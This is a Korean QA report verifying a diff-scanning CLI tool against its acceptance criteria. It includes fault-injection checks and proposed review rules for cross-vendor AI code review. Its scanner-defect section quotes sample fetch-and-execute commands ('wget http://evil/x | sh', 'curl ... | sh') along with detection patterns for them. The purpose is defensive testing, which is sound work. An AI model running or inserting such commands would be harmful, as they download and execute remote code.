# QA Phase 1 독립 검증 보고서 — diff-digest CLI

작성: 브라이언(QA 리드) | 2026-07-05 | 대상: `runs/run_Oz3JuL/diff_digest.py` + `test_diff_digest.py`
스펙: `phase1/design_spec.md` (AC1~AC5) | 방식: **PM/Codex 산출 불신, QA 독립 입력·기준으로 재현**
실행 증거: `phase1/qa_independent_check.py`, `phase1/qa_failclosed_check.py` (전부 스크립트 파일, 인라인 아님)

---

## 최종 판정: ✅ **조건부 PASS**

- **핵심 기능(AC1~AC5)·엣지·fail-closed 전부 QA 독립 재현 통과.** Phase 1 산출물은 스펙을 충족하며 파이프라인 게이트로 쓸 수 있음.
- **단, 위험 스캐너에 오탐 1·미탐 2 발견(Minor~Major).** 정보성(exit 0) 용도에선 무해하나, **`--strict`를 파이프라인 차단 게이트로 쓰는 순간 리스크**가 됨. Phase 2 편입 전 보강 권고. → 그래서 "무조건 PASS"가 아니라 "조건부".

---

## ① AC별 매핑 검증 (QA 독립 입력, `qa_independent_check.py` exit 0)

| AC | 내용 | QA 독립 재현 | 결과 |
|----|------|-------------|------|
| AC1 | 2파일 diff(+3/-1, +0/-5) 통계 정확 | `alpha.py/beta.py` 독립 diff | ✅ PASS |
| AC2a | 추가라인 `eval(` 포착 | ADDED/REMOVED 라벨 diff | ✅ PASS (1건 정확) |
| AC2b | 삭제라인 `eval(` **미**포착 | 위 동일 | ✅ PASS (삭제 누출 없음) |
| AC3 | 빈 입력 → "no changes", exit 0 | stdin 빈 문자열 | ✅ PASS |
| AC4a | `--strict`+위험 → exit 2 | eval 포함 diff | ✅ PASS |
| AC4b | `--strict`+무위험 → exit 0 | `return 42` diff | ✅ PASS |
| AC5 | `--json` 유효 + files/risks 키 | json.loads + 키 확인 | ✅ PASS |

**→ AC1~AC5 전항 독립 통과.** PM L3(자작 diff)와 다른 QA 독립 입력으로도 동일 결론. 교차검증 일치.

## 엣지·부정 케이스 (PM 미검증 영역, QA가 추가)

| ID | 케이스 | 결과 |
|----|--------|------|
| E1 | 바이너리 diff → binary=True, 통계 0 | ✅ PASS (Assumptions 준수) |
| E2 | `@@` 헤더 없는 변칙 diff에서 `rm -rf` 포착 | ✅ PASS (line_no=0이지만 포착됨) |
| E5 | hunk 내 삭제 후 추가라인 line_no 정확(=6) | ✅ PASS (라인번호 계산 정확) |

---

## ② fail-closed 재현 (`qa_failclosed_check.py` exit 0) — "통과만 보는 건 반쪽"

diff_digest에 **의도적 결함을 심어** 게이트가 실패를 실패로 잡는지 실증(원본 불변, 임시 workdir 복사·개악·정리).

| 주입 결함 | 위반 AC | qa_verify 결과 |
|-----------|---------|---------------|
| `scan_risks`가 삭제(-)라인도 포착하도록 개악 | AC2b | `❌ test_scan_risks_added_only` AssertionError → **exit 1** ✅ |
| `parse_diff` added 통계 2배 오산 | AC1 | `❌ test_parse_diff_counts` AssertionError → **exit 1** ✅ |

**→ 두 결함 모두 RED로 포착. 게다가 무관한 테스트는 GREEN 유지(정확히 해당 결함만 포착, 오탐 없음).** fail-closed 성립 확정. PM이 예시로 든 "scan_risks가 삭제라인도 잡는" 시나리오를 실제로 만들어 게이트가 잡음을 실증함.

---

## ③ 발견 결함 — 위험 스캐너 오탐/미탐 (Phase 2 반영 권고)

정보성(exit 0) 기본 용도에선 스펙상 허용(ADR-002)되나, `--strict` 게이트 활용 시 문제.

### D-Q1. 오탐 (False Positive) — Minor
- **현상**: 무해한 `import subprocess`(표준 라이브러리 import)가 위험 패턴 `subprocess`에 히트.
- **재현**: `+import subprocess  # 무해` → scan_risks 1건 포착 (E3, hits=1).
- **영향**: `--strict` 사용 시 정상 import만으로 exit 2 → 파이프라인 오차단 가능. 심각도 Minor(패턴이 너무 광범).
- **권고**: `subprocess.` (메서드 호출) 또는 `subprocess.(run|call|Popen)` 로 좁히기. 순수 import 제외.

### D-Q2. 미탐 (False Negative) — Major (보안 관점)
- **현상**: 실제 위험한데 패턴이 못 잡음.
  - `wget http://evil/x | sh` → **미탐** (E4a: wget잡힘=False). 패턴이 `curl`만 커버.
  - `curl http://evil/x |  sh` (파이프 뒤 공백 2개) → **미탐** (E4b). 패턴 `curl .*\| ?sh`는 공백 0~1개만.
- **영향**: "원격 스크립트 실행" 위험의 대표 변형을 놓침. 보안 스캐너 신뢰도 직결 → 심각도 **Major**.
- **권고**: (a) `(curl|wget|fetch)` 로 확장, (b) `\|\s*sh` 로 파이프 뒤 공백 유연화, (c) `sh|bash|zsh` 셸 확장.

> QA 소견: D-Q2가 더 위험합니다. 오탐은 "너무 많이 걸려" 사람이 거르지만, **미탐은 위험이 조용히 통과**합니다. 보안 게이트에서 미탐 > 오탐 우선순위로 봐야 합니다.

---

## ④ L3 합격 기준 초안 v1 (Phase 2 오케스트레이터 자동 적용용)

L1(기계)·L2(행위)는 qa_verify.sh가 자동. **L3 = 코딩과 다른 벤더(Codex→Claude)가 diff를 읽고 판정**. 아래를 오케스트레이터 스텝으로 자동화 권고.

**L3-1. 스펙 정합 (AC 트레이서빌리티)**
- [ ] design_spec의 모든 AC가 테스트 or 실동작으로 각각 매핑됨 (AC↔test 매트릭스, 미매핑 AC = FAIL)
- [ ] diff에 담긴 변경이 위임 프롬프트 범위 내 (범위 초과 변경 = 반려)

**L3-2. 결함 주입 생존성 (mutation smoke)**
- [ ] 핵심 함수 1~2곳에 자동 mutation(경계연산자 뒤집기 등) 주입 시 테스트가 RED (GREEN이면 = 테스트가 결함을 못 잡음 = FAIL). ← 오늘 fail-closed 방식의 경량 자동화.

**L3-3. 보안 스캔 fail-closed**
- [ ] diff에 시크릿/injection/eval/rm -rf/원격실행 패턴 → 독립 리뷰어가 하나라도 발견 시 FAIL (통과=양 리스트 공백일 때만). requesting-code-review 루브릭 이식.

**L3-4. 교차 벤더 판정**
- [ ] 코딩=Codex면 검수=Claude(다른 벤더). 동일 벤더 자기검수 = 무효.
- [ ] 리뷰어 응답이 파싱 불가/모호 = fail-closed(FAIL 처리).

**L3-5. 증거 요구**
- [ ] 판정 근거로 실제 명령 출력·exit code·diff 첨부. 자기보고 문장만 = 미완료.

판정 규칙: **L3-1~L3-5 전부 통과만 done.** 하나라도 미충족/증거없음 = 재작업. (L1∧L2∧L3)

---

## 릴리스 게이트 판정 (QA)
- **Phase 1 산출물: 조건부 PASS.** AC·엣지·fail-closed 독립 재현 통과 → 파이프라인 실동작 실증됨.
- **선결(Phase 2 진입 전 권고)**: D-Q2(미탐) 우선 수정, D-Q1(오탐) 후속. 위험 패턴은 회귀 테스트에 오탐/미탐 케이스를 **고정 케이스로 추가**해 재발 방지.
- **L3 자동화**: 위 초안 v1을 Phase 2에서 오케스트레이터 스텝으로 구현. 합격 기준 유지보수는 QA가 담당.
